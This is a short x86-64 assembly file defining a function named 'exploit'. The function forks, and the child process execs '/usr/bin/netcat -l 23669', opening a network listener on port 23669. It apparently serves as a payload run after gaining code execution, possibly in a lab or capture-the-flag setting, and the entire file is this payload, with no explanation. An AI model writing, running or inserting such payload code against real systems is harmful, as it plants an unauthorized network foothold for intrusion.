.intel_syntax noprefix

.global exploit
exploit:
    push rbp
    mov rbp, rsp
    sub rsp, 32

    lea rax, .BIN[rip]
    mov [rsp], rax
    lea rax, .ARG1[rip]
    mov [rsp + 8], rax
    lea rax, .ARG2[rip]
    mov [rsp + 16], rax
    mov QWORD PTR[rsp+24], 0

    mov rax, 57
    syscall

    cmp rax, 0
    jne .END


    mov rax, 59
    lea rdi, .BIN[rip]
    mov rsi, rsp
    mov rdx, 0
    syscall


.END:
    leave 
    ret


.ARG1:
    .string "-l"

.ARG2:
    .string "23669"

.BIN:
    .string "/usr/bin/netcat"